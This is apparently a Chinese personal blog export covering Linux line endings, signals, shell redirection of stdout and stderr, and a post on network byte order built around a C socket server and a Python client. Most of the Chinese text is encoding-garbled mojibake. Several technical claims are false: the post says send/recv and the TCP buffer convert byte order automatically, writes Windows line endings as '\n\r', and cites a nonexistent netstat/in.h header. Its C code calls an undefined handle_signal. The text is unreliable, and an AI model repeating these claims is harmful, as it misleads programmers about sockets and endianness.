UNIX å’Œè‹¹æœå¹³å°ä¸Šæ¢è¡Œåˆ™æ˜¯ä½¿ç”¨ 0a æˆ– 0d ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºã€‚ä¸€èˆ¬æ“ä½œç³»ç»Ÿä¸Šçš„è¿è¡Œåº“ä¼šè‡ªåŠ¨å†³å®šæ–‡æœ¬æ–‡ä»¶çš„æ¢è¡Œæ ¼å¼ï¼Œå¦‚ä¸€ä¸ªç¨‹åºåœ¨ windows ä¸Šè¿è¡Œå°±ç”Ÿæˆ CR/LF æ¢è¡Œæ ¼å¼çš„æ–‡æœ¬æ–‡ä»¶ï¼Œè€Œåœ¨ Linux ä¸Šè¿è¡Œå°±ç”Ÿæˆ LF æ ¼å¼æ¢è¡Œçš„æ–‡æœ¬æ–‡ä»¶ã€‚åœ¨ä¸åŒå¹³å°é—´ä½¿ç”¨ FTP è½¯ä»¶ä¼ é€æ–‡ä»¶æ—¶ï¼Œåœ¨ ASCII æ–‡æœ¬æ¨¡å¼ä¼ è¾“æ¨¡å¼ä¸‹ï¼Œ ä¸€äº› FTP å®¢æˆ·ç«¯ç¨‹åºä¼šè‡ªåŠ¨å¯¹æ¢è¡Œæ ¼å¼è¿›è¡Œè½¬æ¢ï¼Œç»è¿‡è¿™ç§ä¼ è¾“çš„æ–‡ä»¶å­—èŠ‚æ•°å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œå¦‚æœä½ ä¸æƒ³ FTP ä¿®æ”¹åŸæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ bin æ¨¡å¼ï¼ˆäºŒè¿›åˆ¶æ¨¡å¼ï¼‰ä¼ è¾“æ–‡æœ¬ã€‚åœ¨è®¡ç®—æœºè¿˜æ²¡æœ‰å‡ºç°ä¹‹å‰ï¼Œæœ‰ä¸€ç§å«åšç”µä¼ æ‰“å­—æœºï¼ˆTeletype Model 33ï¼ŒLinux/Unixä¸‹çš„ttyæ¦‚å¿µä¹Ÿæ¥è‡ªäºæ­¤ï¼‰çš„ç©æ„ï¼Œæ¯ç§’é’Ÿå¯ä»¥æ‰“ 10 ä¸ªå­—ç¬¦ã€‚ä½†æ˜¯å®ƒæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ‰“å®Œä¸€è¡Œæ¢è¡Œçš„æ—¶å€™ï¼Œè¦ç”¨å»0.2ç§’ï¼Œæ­£å¥½å¯ä»¥æ‰“ä¸¤ä¸ªå­—ç¬¦ã€‚è¦æ˜¯åœ¨è¿™ 0.2 ç§’é‡Œé¢ï¼Œåˆæœ‰æ–°çš„å­—ç¬¦ä¼ è¿‡æ¥ï¼Œé‚£ä¹ˆè¿™ä¸ªå­—ç¬¦å°†ä¸¢å¤±ã€‚äºæ˜¯ï¼Œç ”åˆ¶äººå‘˜æƒ³äº†ä¸ªåŠæ³•è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åœ¨æ¯è¡Œåé¢åŠ ä¸¤ä¸ªè¡¨ç¤ºç»“æŸçš„å­—ç¬¦ã€‚ä¸€ä¸ªå«åšâ€œå›è½¦â€ï¼Œå‘Šè¯‰æ‰“å­—æœºæŠŠæ‰“å°å¤´å®šä½åœ¨å·¦è¾¹ç•Œï¼›å¦ä¸€ä¸ªå«åšâ€œæ¢è¡Œâ€ï¼Œå‘Šè¯‰æ‰“å­—æœºæŠŠçº¸å‘ä¸‹ç§»ä¸€è¡Œã€‚è¿™å°±æ˜¯â€œæ¢è¡Œâ€å’Œâ€œå›è½¦â€çš„æ¥å†ï¼Œä»å®ƒä»¬çš„è‹±è¯­åå­—ä¸Šä¹Ÿå¯ä»¥çœ‹å‡ºä¸€äºŒã€‚åæ¥ï¼Œè®¡ç®—æœºå‘æ˜äº†ï¼Œè¿™ä¸¤ä¸ªæ¦‚å¿µä¹Ÿå°±è¢«æ¬åˆ°äº†è®¡ç®—æœºä¸Šã€‚é‚£æ—¶ï¼Œå­˜å‚¨å™¨å¾ˆè´µï¼Œä¸€äº›ç§‘å­¦å®¶è®¤ä¸ºåœ¨æ¯è¡Œç»“å°¾åŠ ä¸¤ä¸ªå­—ç¬¦å¤ªæµªè´¹äº†ï¼ŒåŠ ä¸€ä¸ªå°±å¯ä»¥ã€‚äºæ˜¯ï¼Œå°±å‡ºç°äº†åˆ†æ­§ã€‚Unixç³»ç»Ÿé‡Œï¼Œæ¯è¡Œç»“å°¾åªæœ‰â€œ&lt;æ¢è¡Œ&gt;â€ï¼Œå³â€\\nâ€ï¼›Macç³»ç»Ÿé‡Œï¼Œæ¯è¡Œç»“å°¾æ˜¯â€œ&lt;å›è½¦&gt;â€ï¼Œå³â€\\râ€ï¼›Windowsç³»ç»Ÿé‡Œé¢ï¼Œæ¯è¡Œç»“å°¾æ˜¯â€œ&lt;æ¢è¡Œ&gt;&lt;å›è½¦ &gt;â€ï¼Œå³â€œ\\n\\râ€ã€‚ä¸€ä¸ªç›´æ¥åæœæ˜¯ï¼ŒUnix/Macç³»ç»Ÿä¸‹çš„æ–‡ä»¶åœ¨ Windowsé‡Œæ‰“å¼€çš„è¯ï¼Œæ‰€æœ‰æ–‡å­—ä¼šå˜æˆä¸€è¡Œï¼›è€ŒWindowsé‡Œçš„æ–‡ä»¶åœ¨Unix/Macä¸‹æ‰“å¼€çš„è¯ï¼Œåœ¨æ¯è¡Œçš„ç»“å°¾å¯èƒ½ä¼šå¤šå‡ºä¸€ä¸ª^Mç¬¦å·ã€‚ å› ä¸º Windows å’Œ Linux ä¸­çš„æ¢è¡Œç¬¦ä¸ä¸€è‡´ï¼Œå‰è€…ä½¿ç”¨CRLF(å³\\r\\n)è¡¨ç¤ºæ¢è¡Œï¼Œåè€…åˆ™ä½¿ç”¨LF(å³\\n)è¡¨ç¤ºæ¢è¡Œè€ŒCè¯­è¨€æœ¬èº«ä½¿ç”¨LF(å³\\n)è¡¨ç¤ºæ¢è¡Œï¼Œæ‰€ä»¥åœ¨æ–‡æœ¬æ¨¡å¼ä¸‹ï¼Œéœ€è¦è½¬æ¢æ ¼å¼(å¦‚Windows)ï¼Œä½†æ˜¯åœ¨ Linux ä¸‹ï¼Œæ–‡æœ¬æ¨¡å¼å’ŒäºŒè¿›åˆ¶æ¨¡å¼å°±æ²¡æœ‰ä»€ä¹ˆåŒºåˆ« å¦å¤–ï¼Œä»¥æ–‡æœ¬æ–¹å¼æ‰“å¼€æ—¶ï¼Œé‡åˆ°ç»“æŸç¬¦CTRLZ(0x1A)å°±è®¤ä¸ºæ–‡ä»¶å·²ç»ç»“æŸæ‰€ä»¥ï¼Œè‹¥ä½¿ç”¨æ–‡æœ¬æ–¹å¼æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°±å¾ˆå®¹æ˜“å‡ºç°æ–‡ä»¶è¯»ä¸å®Œæ•´ï¼Œæˆ–å…§å®¹ä¸å¯¹çš„é”™è¯¯å³ä½¿æ˜¯ç”¨æ–‡æœ¬æ–¹å¼æ‰“å¼€æ–‡æœ¬æ–‡ä»¶ï¼Œä¹Ÿè¦è°¨æ…ä½¿ç”¨ï¼Œæ¯”å¦‚å¤åˆ¶æ–‡ä»¶ï¼Œå°±ä¸åº”è¯¥ä½¿ç”¨æ–‡æœ¬æ–¹å¼ signalå¤„ç†HakTip - Linux Terminal 101: Controlling Processes linuxä¸Šä¿¡å·æœ‰32ç§ï¼Œå¤šæ•°åœ¨Cè¯­è¨€ä¸­éƒ½æœ‰é»˜è®¤çš„å¤„ç†æ–¹å¼ï¼ˆå¹¶ä¸”è¿™ç§é»˜è®¤çš„å¤„ç½®æ–¹å¼ä¹Ÿæ˜¯å¯ä»¥æ›´æ”¹çš„ï¼‰ï¼Œé™¤äº†SIGKILL(å¼ºè¡Œterminate)å’ŒSIGSTOP(debugé‡åˆ°æ–­ç‚¹)ä¸å…è®¸å¼€å‘è€…æ›´æ”¹å¤„ç†æ–¹å¼ã€‚(kill -9ä¹Ÿå°±æ˜¯å¼ºæ€éå¸¸æœ‰æ•ˆ)cç¨‹åºå¯ä»¥é€šè¿‡signal(æ¯”è¾ƒè€äº†)å‡½æ•°æˆ–è€…sigaction(æ¨è)å‡½æ•°æ³¨å†Œæ”¶åˆ°ä¿¡å·ä¹‹åçš„åŠ¨ä½œ Linux by default use the RAM as disk cacheè¿™é‡Œçš„å›ç­”è§£é‡Šäº†ç³»ç»Ÿä¼šé»˜è®¤åœ¨å†…å­˜ä¸­ç¼“å­˜ç£ç›˜èŠ‚ç‚¹çš„ä¿¡æ¯ï¼Œä¸‹ä¸€æ¬¡è¿›è¡Œfindçš„æ“ä½œæ—¶å€™ï¼Œå°±ä¼šå¿«å¾ˆå¤šã€‚ linuxä¸Šä½¿ç”¨ Ctrl-R è€Œä¸æ˜¯ä¸Šä¸‹é”®æœç´¢å†å² shellé‡Œé¢çš„é‡å®šå‘ Standard outputåˆ°åº•æ˜¯ä¸ªä»€ä¹ˆç©æ„ Every Unix-based operating system has a concept of â€œa default place for output to goâ€. Since that phrase is a mouthful, everyone calls it â€œstandard outputâ€, or â€œstdoutâ€, pronounced standard out. Your shell (probably bash or zsh) is constantly watching that default output place. When your shell sees new output there, it prints it out on the screen so that you, the human, can see it. Otherwise echo hello would send â€œhelloâ€ to that default place and it would stay there forever. Standard input (â€œstdinâ€, pronounced standard in) is the default place where commands listen for information. For example, if you type cat with no arguments, it listens for input on stdin, outputting what you type to stdout, until you send it an EOF character (CTRL+d): Standard errorStandard error (â€œstderrâ€) is like standard output and standard input, but itâ€™s the place where error messages go. To see some stderr output, try catting a file that doesnâ€™t exist: $ cat does-not-exist | sed â€˜s/No such/ROBOT SMASH/â€˜cat: does-not-exist: No such file or directoryWhoa - nothing changed! Remember, pipes take the stdout of the command to the left of the pipe. catâ€˜s error output went to stderr, not stdout, so nothing came through the pipe to sed. Itâ€™s good that stderr doesnâ€™t go through the pipe by default: when we pipe output through something that doesnâ€™t output stdout to the terminal, we still want to see errors immediately. For example, imagine a command that reads stdin and sends it to the printer: you wouldnâ€™t want to have to walk over to the printer to see its errors.We need to redirect catâ€™s stderr to stdout so that it goes through the pipe. And that means we need to learn about redirecting output. unixä¸‹redirect file descriptorRedirecting outputA file descriptor, or FD, is a positive integer that refers to an input/output source. For example, stdin is 0, stdout is 1, and stderr is 2. Those might seem like arbitrary numbers, because they are: the POSIX standard defines them as such, and many operating systems (like OS X and Linux) implement at least this part of the POSIX standard. echo â€œhello thereâ€ &gt;&amp;2 // è¿™å¥è¯æœ¬æ¥æ˜¯åº”è¯¥æ˜¾ç¤ºåœ¨stdoutputä¸­çš„ï¼Œä½†æ˜¯è¿™é‡Œé‡å®šå‘åˆ°stderräº†,å¯ä»¥æŠŠstderrè¿™ç§çœ‹åšç‰¹æ®Šçš„file descriptoräº†ã€‚é‡å®šå‘çš„æ—¶å€™ç®­å¤´åé¢è¦è·Ÿä¸€ä¸ª&amp;å·ã€‚ ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼Œå› ä¸ºpipeé»˜è®¤æ˜¯åªç›‘è§†stdoutçš„, é€å¾€stderrçš„ä¸œè¥¿æ˜¯æ²¡æœ‰å½±å“çš„ Redirect to stdout, so it comes through the pipe$ echo â€œno changesâ€ &gt;&amp;1 | sed â€œs/no/some/â€œsome changes Redirect to stderr, so it does not come through$ echo â€œno changesâ€ &gt;&amp;2 | sed â€œs/no/some/â€œno changes ä½†æ˜¯ï¼Œå¯¹äºzshç”¨æˆ·ï¼Œç”±äºzshé»˜è®¤æ‰“å¼€äº†MULTIOS optionã€‚ This is due to ZSHâ€™s MULTIOS option, which is on by default. The MULTIOS option means that echo something &gt;&amp;1 | other_command will output to FD 1 and pipe the output to other_command, rather than only piping it. To turn this off, run unsetopt MULTIOS. # ZSH with MULTIOS option on $ echo &quot;hello there&quot; &gt;&amp;1 | sed &quot;s/hello/hi/&quot; hi there //è¦æ˜¯Bashçš„è¯ï¼Œè¿™ä¸€è¡Œå°±ä¸ä¼šå‡ºç°ï¼Œç¬¬ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºç›´æ¥è¢«Pipeåˆ°ä¸‹ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥äº†ï¼Œéƒ½ä¸ä¼šæ˜¾ç¤º hi there $ echo &quot;hello there&quot; &gt;&amp;2 | sed &quot;s/hello/hi/&quot; hello there hi there Letâ€™s say you have stderr output mingled with stdout output â€“ perhaps youâ€™re running the same command over many files, and the command may output to stdout or stderr each time. For convenience, the command outputs â€œstdoutâ€ to stdout, and â€œstderrâ€ to stderr, plus the file name. The visual output looks like this: $ ./command file1 file2 file3stdout file1stderr file2stdout file3We want to transform every line to have â€œRobot says: â€ before it, but just piping the command to sed wonâ€™t work, because (again) pipes only grab stdout:$ ./command file1 file2 file3 | sed â€œs/^/Robot says: /â€œstderr file2Robot says: stdout file1Robot says: stdout file3This is a common use case for file descriptors: redirect stderr to stdout to combine stderr and stdout, so you can pipe everything as stdout to another process.Letâ€™s try it:$ ./command file1 file2 file3 2&gt;&amp;1 | sed â€œs/std/Robot says: std/â€œRobot says: stderr file2Robot says: stdout file1Robot says: stdout file3 It worked! We successfully redirected stderr (FD 2) into stdout (FD 1), combining them and sending the combined output through stdout.è¿™ä¸‹çŸ¥é“nohup xxx &gt; /dev/null 2&gt;&amp;1 &amp; æ˜¯ä»€ä¹ˆæ„æ€äº†å§(&gt;dev/nullæ˜¯æ— åº•æ´çš„æ„æ€ï¼Œ 2&gt;&amp;1 æ˜¯å§file descriptor 2ä¹Ÿå°±æ˜¯stderré‡å®šå‘åˆ°file descriptor 1ä¹Ÿå°±æ˜¯stdout , &amp; æ˜¯åå°è¿è¡Œçš„æ„æ€) # Correct &gt; log-file 2&gt;&amp;1 # Wrong 2&gt;&amp;1 &gt; log-file The correct version points stdout at the log file, then redirects stderr to stdout, so both stderr and stdout point at the log file. The wrong version points stderr at stdout (which outputs to the shell), then redirects stdout to the file. Thus only stdout is pointing at the file, because stderr is pointing to the â€œoldâ€ stdout. Another common use for redirecting output is redirecting only stderr. To redirect a file descriptor, we use N&gt;, where N is a file descriptor. If thereâ€™s no file descriptor, then stdout is used, like in echo hello &gt; new-file.We can use this new syntax to silence stderr by redirecting it to /dev/null, which happily swallows whatever it receives and does nothing with it. Itâ€™s the black hole of input/output. Letâ€™s try it: Redirect stdout, because itâ€™s plain &gt;$ ./command file1 file2 file3 &gt; log-filestderr file2 Redirect stderr, because itâ€™s 2&gt;$ ./command file1 file2 file3 2&gt; log-filestdout file1stdout file3 æ¯”æ–¹è¯´è¿™ä¸ªå‘½ä»¤/tmp/test.sh &gt; /tmp/test.log 2&gt;&amp;1æ‰§è¡Œshè„šæœ¬ï¼Œè¾“å‡ºåˆ°logæ–‡ä»¶ä¸­ï¼ŒæŠŠé”™è¯¯ä¿¡æ¯ä¹Ÿå†™è¿›æ–‡ä»¶æ‰€ä»¥ç»å¸¸çœ‹åˆ°çš„nohup /mnt/Nand3/H2000G &gt;/dev/null 2&gt;&amp;1 &amp;å°±æ˜¯æŠŠè¾“å‡ºä¸¢è¿›åƒåœ¾æ¡¶ï¼Œè·Ÿç€æŠŠé”™è¯¯ä¹Ÿä¸¢è¿›åƒåœ¾æ¡¶ï¼Œåé¢é‚£ä¸ªæ˜¯åå°è¿è¡Œçš„æ„æ€ ä½¿ç”¨ dmesg æ¥æŸ¥çœ‹ä¸€äº›ç¡¬ä»¶æˆ–é©±åŠ¨ç¨‹åºçš„ä¿¡æ¯æˆ–é—®é¢˜ã€‚æ„Ÿè§‰åƒæ˜¯æŸ¥çœ‹ç³»ç»Ÿå¯åŠ¨æ—¥å¿— æ–‡ä»¶å¤¹/sys/devices/system/cpuå°±æ˜¯å¯¹cpuçš„æ–‡ä»¶æ˜ å°„ã€‚è¿›å…¥ä»¥åï¼Œéšä¾¿è¿›ä¸€ä¸ªcpuæ ¸ï¼Œå¯ä»¥çœ‹åˆ°cacheæ–‡ä»¶å¤¹ï¼Œtreeä»¥åï¼š . â”œâ”€â”€ index0 â”‚ â”œâ”€â”€ coherency_line_size â”‚ â”œâ”€â”€ level â”‚ â”œâ”€â”€ number_of_sets â”‚ â”œâ”€â”€ physical_line_partition â”‚ â”œâ”€â”€ shared_cpu_list â”‚ â”œâ”€â”€ shared_cpu_map â”‚ â”œâ”€â”€ size â”‚ â”œâ”€â”€ type â”‚ â””â”€â”€ ways_of_associativity â”œâ”€â”€ index1 â”‚ â”œâ”€â”€ coherency_line_size â”‚ â”œâ”€â”€ level â”‚ â”œâ”€â”€ number_of_sets â”‚ â”œâ”€â”€ physical_line_partition â”‚ â”œâ”€â”€ shared_cpu_list â”‚ â”œâ”€â”€ shared_cpu_map â”‚ â”œâ”€â”€ size â”‚ â”œâ”€â”€ type â”‚ â””â”€â”€ ways_of_associativity â”œâ”€â”€ index2 â”‚ â”œâ”€â”€ coherency_line_size ...åŒä¸Šä¸€ä¸ªæ–‡ä»¶å¤¹ â”‚ â””â”€â”€ ways_of_associativity â””â”€â”€ index3 â”œâ”€â”€ coherency_line_size ...åŒä¸Šä¸€ä¸ªæ–‡ä»¶å¤¹ â””â”€â”€ ways_of_associativity","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"ç½‘ç»œä¼ è¾“çš„å­—èŠ‚åºé—®é¢˜","date":"2018-11-03T10:38:04.000Z","path":"2018/11/03/2018-11-03-idea-byte-endianness/","text":"å­—èŠ‚åºï¼ˆEndiannessï¼‰ï¼Œåœ¨è®¡ç®—æœºç§‘å­¦é¢†åŸŸä¸­ï¼Œæ˜¯è·¨è¶Šå¤šå­—èŠ‚çš„ç¨‹åºå¯¹è±¡çš„å­˜å‚¨è§„åˆ™ã€‚ é¦–å…ˆç¡®è®¤ä¸‹cè¯­è¨€ä¸‹åŸºæœ¬æ•°æ®ç±»å‹å¤§å°printf(&quot;sizeof(int)= %ld\\n&quot;,sizeof(int)); printf(&quot;sizeof(char)= %ld\\n&quot;,sizeof(char)); printf(&quot;sizeof(long)= %ld\\n&quot;,sizeof(long)); printf(&quot;sizeof(float)= %ld\\n&quot;,sizeof(float)); printf(&quot;sizeof(short)= %ld\\n&quot;,sizeof(short)); sizeof(int)= 4sizeof(char)= 1sizeof(long)= 8sizeof(float)= 4sizeof(short)= 2 æ¥çœ‹ä¸€ä¸‹cè¯­è¨€è¿™è¾¹ç”¨socketä»¥intï¼Œlongçš„å½¢å¼å‘é€æ•°æ®ï¼ŒPythonè¿™è¾¹æ¥æ”¶ä¼šæ˜¯æ€ä¹ˆæ ·çš„cè¯­è¨€çš„serveré•¿è¿™æ · #include &lt;stdio.h&gt; #include &lt;netinet/in.h&gt; #include &lt;sys/socket.h&gt; // socket #include &lt;sys/types.h&gt; // åŸºæœ¬æ•°æ®ç±»å‹ #include &lt;unistd.h&gt; // read write #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;fcntl.h&gt; // open close #include &lt;sys/shm.h&gt; #include &lt;signal.h&gt; #define PORT 7037 #define SERV &quot;0.0.0.0&quot; #define QUEUE 20 #define BUFF_SIZE 1024 int sockfd; int main(int argc,char *argv[ ]){ signal(SIGINT,handle_signal); int count = 0; // è®¡æ•° // å®šä¹‰ socket sockfd = socket(AF_INET,SOCK_STREAM,0); // å®šä¹‰ sockaddr_in struct sockaddr_in skaddr; skaddr.sin_family = AF_INET; // ipv4 skaddr.sin_port = htons(PORT); skaddr.sin_addr.s_addr = inet_addr(SERV); // bindï¼Œç»‘å®š socket å’Œ sockaddr_in if( bind(sockfd,(struct sockaddr *)&amp;skaddr,sizeof(skaddr)) == -1 ){ perror(&quot;bind error&quot;); exit(1); } // listenï¼Œå¼€å§‹æ·»åŠ ç«¯å£ if( listen(sockfd,QUEUE) == -1 ){ perror(&quot;listen error&quot;); exit(1); } // å®¢æˆ·ç«¯ä¿¡æ¯ char buff[BUFF_SIZE]; struct sockaddr_in claddr; socklen_t length = sizeof(claddr); while(1){ int sock_client = accept(sockfd,(struct sockaddr *)&amp;claddr, &amp;length); printf(&quot;%d\\n&quot;,++count); if( sock_client &lt;0 ){ perror(&quot;accept error&quot;); exit(1); } int a[3]={1,2,3}; //åœ¨è¿™é‡Œå‘é€å‡ºbyteæ•°ç»„ send(sock_client,(char*)a,sizeof(a),0); close(sock_client); } fputs(&quot;have a nice day&quot;,stdout); close(sockfd); return 0; } pythonçš„clienté•¿è¿™æ ·ï¼š #!/usr/bin/python # -*- coding: UTF-8 -*- import socket # åˆ›å»ºä¸€ä¸ªsocket: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # å»ºç«‹è¿æ¥: s.connect((&#39;192.168.1.45&#39;, 7037)) s.send(b&#39;GET / HTTP/1.1\\r\\nHost: www.sina.com.cn\\r\\nConnection: close\\r\\n\\r\\n&#39;) # æ¥æ”¶æ•°æ®: buffer = [] while True: d = s.recv(1) ##å…¶å®è¿™é‡Œåº”è¯¥æ˜¯æœ‰è¯¯åŒºçš„ï¼Œï¼Œrecvå¹¶ä¸æ˜¯ä»socketé‡Œç›´æ¥è¯»æ•°æ®ï¼Œrecvåªæ˜¯ä»tcpçš„bufferä¸­(å·²ç»å¸®æˆ‘ä»¬è½¬æˆäº†å°ç«¯ï¼Œæ‰€ä»¥è¿™äº‹åº”è¯¥å¾—æŠ“åŒ…æ‰èƒ½çœ‹æ‡‚ï¼‰ t = &#39;&#39; for x in d: print(format(x,&#39;b&#39;)) if d: buffer.append(d) else: break data = b&#39;&#39;.join(buffer) print(data) s.close() åœ¨recvã€sendã€recvfromã€sendtoå‡½æ•°ä¸­ï¼Œå·²ç»è‡ªåŠ¨å¸®æˆ‘ä»¬è¿›è¡Œäº†ç›¸åº”çš„å­—èŠ‚åºçš„è½¬æ¢ï¼›è€Œåœ¨å¤„ç†sockaddrçš„æ—¶å€™å°±è¦æ³¨æ„äº†ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ‰‹åŠ¨çš„è½¬æ¢ç›¸åº”çš„å­—èŠ‚åº åœ¨å±€åŸŸç½‘å†…çš„ä¸¤å°ç”µè„‘,serverè·‘åœ¨macä¸Š,clientè·‘åœ¨win10clientè¿™è¾¹æ‰“å°å‡ºäº† 1 0 0 0 ===æˆ‘æ˜¯å››ä¸ªbyteç­‰äºä¸€ä¸ªintçš„æ‰‹åŠ¨åˆ†å‰²çº¿=== 10 0 0 0 ===æˆ‘æ˜¯å››ä¸ªbyteç­‰äºä¸€ä¸ªintçš„æ‰‹åŠ¨åˆ†å‰²çº¿=== 11 0 0 0 å‰å››ä¸ªå­—èŠ‚æ˜¯â€1â€1 0 0 00 0 0 1 -&gt; æ˜¾ç„¶æ˜¯1 ä¸­é—´å››ä¸ªå­—èŠ‚æ˜¯â€2â€10 0 0 00 0 0 10 -&gt; æ˜¾ç„¶æ˜¯2 æœ€åå››ä¸ªå­—èŠ‚æ˜¯â€3â€11 0 0 00 0 0 11 -&gt; æ˜¾ç„¶æ˜¯3 è¿™ä¸ªå®éªŒå…¶å®æ²¡æœ‰è¯æ˜ä»€ä¹ˆï¼Œcè¯­è¨€ç«¯å‘å‡ºçš„int[3] = {1, 2, 3}åœ¨èµ°tcpå±‚çš„æ—¶å€™å…¶å®æ˜¯[0001, 0002, 0003]è¿™ä¹ˆå‘çš„ï¼Œè¾¾åˆ°è¾¾å®¢æˆ·ç«¯çš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯çš„tcp bufferæ”¶åˆ°äº†ä¹‹åæ‰‹åŠ¨æŠŠæ¯ä¸ªè½¬æˆå°ç«¯[1000, 2000,3000] ï¼Œåº”ç”¨å±‚ç¨‹åºè¯»å–çš„æ—¶å€™æ˜¯ä»è¿™ä¸ªbufferé‡Œé¢è¯»å–çš„ è¿™é‡Œå¦‚æœæŠŠcè¯­è¨€çš„serveræ”¹ä¸€ä¸‹ float a[3]={1,2,3}; //åœ¨è¿™é‡Œå‘é€å‡ºbyteæ•°ç»„ send(sock_client,(char*)a,sizeof(a),0); clientä¸€å­—ä¸æ”¹ï¼Œå¾—åˆ°çš„æ˜¯ 0 0 10000000 111111 ===æˆ‘æ˜¯å››ä¸ªbyteç­‰äºä¸€ä¸ªfloatçš„æ‰‹åŠ¨åˆ†å‰²çº¿=== 0 0 0 1000000 ===æˆ‘æ˜¯å››ä¸ªbyteç­‰äºä¸€ä¸ªfloatçš„æ‰‹åŠ¨åˆ†å‰²çº¿=== 0 0 1000000 1000000 è¿™ä¸ªå…¶å®è·Ÿfloatæ˜¯å¦‚ä½•è¡¨ç¤ºå°æ•°æœ‰å…³äº†ï¼Œfloatæœ‰å‡ ä¸ªbitæ˜¯ä¸“é—¨ç»™å°æ•°ç‚¹åé¢çš„æ•°å€¼å’ŒæŒ‡æ•°å‡†å¤‡çš„ã€‚floatæ˜¯4ä¸ªbyteï¼Œè¿™32ä½æ˜¯è¿™ä¹ˆåˆ†çš„ï¼š1bitï¼ˆç¬¦å·ä½ï¼‰ 8bitsï¼ˆæŒ‡æ•°ä½ï¼‰ 23bitsï¼ˆå°¾æ•°ä½ï¼‰ï¼ˆå†…å­˜ä¸­å°±é•¿è¿™æ ·ï¼‰ æ”¹æˆlongå‘¢ï¼Œshortå‘¢ï¼Ÿæ”¹æˆlong 1 0 0 0 0 0 0 0 ===æˆ‘æ˜¯å…«ä¸ªbyteç­‰äºä¸€ä¸ªlongçš„æ‰‹åŠ¨åˆ†å‰²çº¿=== 10 0 0 0 0 0 0 0 ===æˆ‘æ˜¯å…«ä¸ªbyteç­‰äºä¸€ä¸ªlongçš„æ‰‹åŠ¨åˆ†å‰²çº¿=== 11 0 0 0 0 0 0 0 é—®é¢˜å·²ç»å¾ˆæ¸…æ¥šäº†ã€‚ä¸Šè¿°æ˜¯æŠŠæ•°å­—å½“åšint,long,floatè¿™ç§æ•°æ®ç±»å‹æ¥å‘é€ï¼Œä½†å¦‚æœæ˜¯æŠŠ123è¿™ä¸‰ä¸ªæ•°å­—å½“åšâ€123â€è¿™ç§å­—ç¬¦ä¸²ï¼Œæ•°å­—1å…¶å®åªç”¨ä¸€ä¸ªbyte(utf-8ä¸‹)å°±è§£å†³äº†ï¼Œä¹Ÿå°±ä¸å­˜åœ¨ä»€ä¹ˆå­—èŠ‚åºçš„é—®é¢˜äº† å¦‚Cç¼–å†™çš„è¿›ç¨‹å’ŒJavaç¼–å†™çš„è¿›ç¨‹é—´é€šä¿¡ï¼Œ(JVMä¹Ÿæ˜¯å¤§ç«¯ï¼‰ã€‚åœ¨ä¸»æœºå’Œç½‘ç»œå­—èŠ‚åºçš„äº’ç›¸è½¬åŒ–ä¸»è¦æ¶‰åŠIPåœ°å€å’Œç«¯å£ã€‚cè¯­è¨€å†™serverè¦è€è€å®å®å»è½¬æ¢ipåœ°å€å’Œç«¯å£çš„å­—èŠ‚åºï¼Œè¿™ä¹Ÿæ˜¯ä¸ºäº†éµå®ˆè§„èŒƒ #include &lt;netstat/in.h&gt; unsigned long int htonl(unsigned long int hostlong); unsigned short int htons(unsigned short int hostshort); unsigned long int ntohl(unsigned long int netlong); unsigned short int ntohs(unsigned short int netshort); ç½‘ç»œå­—èŠ‚åºæ˜¯ä¸€ç§è§„å®šï¼Œå®ƒè§„å®šäº†ä¼ è¾“çš„æ•°æ®åº”è¯¥æŒ‰ç…§å¤§ç«¯ï¼Œå› ä¸ºé€šä¿¡åŒæ–¹çš„å­—èŠ‚åºå…¶å®æ˜¯ä¸ç¡®å®šçš„ï¼Œä½†æ˜¯æŒ‰ç…§è§„å®šæˆ‘ä»¬éƒ½è®¤ä¸ºæ¥æ”¶åˆ°çš„æ•°æ®éƒ½æ˜¯å¤§ç«¯ï¼Œå³éµå®ˆè§„å®šçš„é¡ºåºï¼Œè¿™æ ·è€è€å®å®åœ°é€šè¿‡htonsç³»åˆ—å‡½æ•°å¤„ç†æ ¼å¼åŒ–çš„æ•°æ®ï¼ˆå¦‚intï¼‰ä¿è¯äº†ä¸ä¼šå‡ºç°ä»»ä½•é”™è¯¯ã€‚ ä½†æ˜¯ï¼Œæˆ‘ä»¬è‡ªå·±å†™çš„C/Så› ä¸ºéƒ½æ˜¯å°ç«¯ï¼Œæ‰€ä»¥å³ä½¿æ²¡æœ‰éµå®ˆè§„å®šï¼Œä¾ç„¶å¯ä»¥ç”¨ï¼Œä½†è¿™æ ·å¹¶ä¸è§„èŒƒï¼Œæœ‰æ½œåœ¨çš„éšæ‚£ã€‚ è€Œå¯¹äºIPåœ°å€æˆ–è€…ç«¯å£ï¼Œå› ä¸ºè¿™äº›æ•°æ®çš„å¤„ç†å…¨éƒ¨æ˜¯åœ¨åº”ç”¨å±‚ä»¥ä¸‹ï¼Œæ˜¯è·¯ç”±å™¨ï¼Œç½‘å¡è¿›è¡Œå¤„ç†ï¼Œå®ƒä»¬åœ¨è®¾è®¡æ—¶è‡ªç„¶éµå®ˆè§„å®šå…¨éƒ¨ä¾ç…§ç½‘ç»œå­—èŠ‚åºå¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼Œè€Œä½ è‡ªå·±ä¸æŠŠIPåœ°å€è½¬æ¢é¡ºåºï¼Œäº¤ç»™ä¸‹å±‚å¤„ç†æ—¶è‡ªç„¶ä¼šå‡ºé”™ã€‚ æ‰€ä»¥ï¼Œåœ¨åº”ç”¨å±‚ï¼Œä¹Ÿåº”è¯¥éµå®ˆè§„å®šï¼Œå¯¹äºint double è¿™æ 